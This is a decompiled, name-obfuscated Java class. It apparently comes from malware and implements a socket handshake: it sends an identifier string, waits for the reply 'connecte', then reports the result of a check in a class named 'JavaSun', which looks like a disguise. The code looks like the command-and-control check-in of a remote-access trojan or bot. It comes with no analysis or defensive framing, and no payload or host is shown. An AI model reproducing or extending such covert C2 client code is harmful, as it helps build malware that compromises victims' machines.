import java.io.IOException;
import java.io.Reader;
import java.io.InputStreamReader;
import java.io.BufferedReader;
import java.io.PrintWriter;
import java.net.Socket;

// 
// Decompiled by Procyon v0.5.30
// 

public class WNKDQXsaCL implements Runnable
{
    private Socket pxClBqBpre;
    public static String BRNqqOVftS;
    private PrintWriter ONHhbNBMVt;
    private BufferedReader kVUllQBDuC;
    static boolean JpaTLmZWdD;
    static boolean tRfsINbEFN;
    static boolean iGFCwIVcME;
    
    public WNKDQXsaCL(final Socket pxClBqBpre) {
        this.pxClBqBpre = null;
        this.ONHhbNBMVt = null;
        this.kVUllQBDuC = null;
        this.pxClBqBpre = pxClBqBpre;
    }
    
    @Override
    public void run() {
        try {
            this.ONHhbNBMVt = new PrintWriter(this.pxClBqBpre.getOutputStream());
            this.kVUllQBDuC = new BufferedReader(new InputStreamReader(this.pxClBqBpre.getInputStream()));
            while (!WNKDQXsaCL.JpaTLmZWdD) {
                WNKDQXsaCL.BRNqqOVftS = "PRuHF5mA-iboX-CHnn-jlbB-F6wlmPjPbTac";
                this.ONHhbNBMVt.println(WNKDQXsaCL.BRNqqOVftS);
                this.ONHhbNBMVt.flush();
                if (!this.kVUllQBDuC.readLine().equals("connecte")) {
                    break;
                }
                WNKDQXsaCL.JpaTLmZWdD = true;
                if (!WNKDQXsaCL.JpaTLmZWdD) {
                    continue;
                }
                WNKDQXsaCL.tRfsINbEFN = true;
                Thread.sleep(5000L);
                if (!JavaSun.hrkHPLxdMM()) {
                    continue;
                }
                this.ONHhbNBMVt.println("true");
                this.ONHhbNBMVt.flush();
            }
        }
        catch (IOException ex) {}
        catch (InterruptedException ex2) {}
    }
    
    static {
        WNKDQXsaCL.BRNqqOVftS = null;
        WNKDQXsaCL.JpaTLmZWdD = false;
        WNKDQXsaCL.tRfsINbEFN = (null != null);
        WNKDQXsaCL.iGFCwIVcME = false;
    }
}
